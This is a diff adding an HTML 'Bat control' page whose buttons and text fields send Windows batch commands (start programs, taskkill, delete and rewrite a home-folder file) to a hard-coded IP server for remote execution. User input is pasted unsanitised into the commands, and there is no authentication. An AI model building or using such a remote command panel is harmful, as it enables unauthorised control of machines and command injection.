@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bat control</title>
+    <script>
+        function execute (command) {
+            let script = document.createElement('script');
+            script.src = 'http://3.89.196.174:8080/?batcontent='+command;
+            document.querySelector('body').appendChild(script);
+        }
+
+        window.onload = function () {
+            document.querySelector('#startPaint').onclick = function () {
+                execute('mspaint\\r\\nREM ' + (new Date).getTime());
+            };
+            document.querySelector('#closePaint').onclick = function () {
+                execute('taskkill /f /im mspaint.exe\\r\\nREM ' + (new Date).getTime());
+            };
+            document.querySelector('#echo').onclick = function () {
+                execute('del C:%25HOMEPATH%25\\\\file.txt\\r\\necho ' + document.querySelector('#echoinput').value + ' >> C:%25HOMEPATH%25\\\\file.txt\\r\\nnotepad C:%25HOMEPATH%25\\\\file.txt\\r\\nREM ' + (new Date).getTime());
+            };
+            document.querySelector('#site').onclick = function() {
+                execute('start chrome '+document.querySelector('#siteinput').value+'\\r\\nREM ' + (new Date).getTime());
+            };
+            document.querySelector('#start').onclick = function() {
+                execute('start '+document.querySelector('#startinput').value+'\\r\\nREM ' + (new Date).getTime());
+            };
+            document.querySelector('#kill').onclick = function() {
+                execute('taskkill /f /im '+document.querySelector('#killinput').value+'\\r\\nREM ' + (new Date).getTime());
+            };
+        }
+    </script>
+</head>
+<body>
+<table>
+    <tr>
+        <td>Start Paint</td>
+        <td><input type="button" id="startPaint" value="Start"></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td>Close Paint</td>
+        <td><input type="button" id="closePaint" value="Close"></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td>
+            <label for="echoinput">Echo</label>
+        </td>
+        <td>
+            <input type="text" id="echoinput">
+        </td>
+        <td>
+            <input type="button" id="echo" value="Echo">
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <label for="siteinput">Open site</label>
+        </td>
+        <td>
+            <input type="text" id="siteinput">
+        </td>
+        <td>
+            <input type="button" value="Open" id="site">
+        </td>
+    </tr>
+    <tr>
+        <td><label for="startinput">Start</label></td>
+        <td><input type="text" id="startinput"></td>
+        <td><input type="button" value="Start" id="start"></td>
+    </tr>
+    <tr>
+        <td><label for="killinput">Task kill</label></td>
+        <td><input type="text" id="killinput"></td>
+        <td><input type="button" value="Kill" id="kill"></td>
+    </tr>
+</table>
+</body>
+</html>
